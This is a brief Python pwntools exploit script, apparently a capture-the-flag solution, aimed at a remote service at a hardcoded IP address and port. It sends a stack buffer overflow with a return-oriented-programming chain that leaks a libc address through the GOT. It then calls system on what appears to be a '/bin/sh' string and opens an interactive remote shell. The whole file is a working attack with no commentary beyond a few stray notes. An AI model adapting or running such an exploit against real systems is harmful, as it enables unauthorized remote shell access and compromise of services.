from pwn import *
context.log_level='debug'
#p=process('./')
start=0x400570
got=0x400520
rdi=0x400784-1
rsi=rdi-2
for x in range(0x0,1):
	p=remote("34.92.37.22",10000)
	p.sendafter("!\n","A"*0x28+p64(rdi)+p64(1)+p64(rsi)+p64(0x601018)+p64(0)+p64(got)+p64(start)[:-1])
	base=u64(p.read(8))-(0x0f72b0)
	log.info(hex(base))
	p.sendafter("!\n","A"*0x28+p64(rdi)+p64(0x18cd57+base)+p64(base+0x045390))
	p.interactive()
#	except Exception:
#		p.close()

#4f0
#520 puts...
#540
#got=0x400526+0x200af2
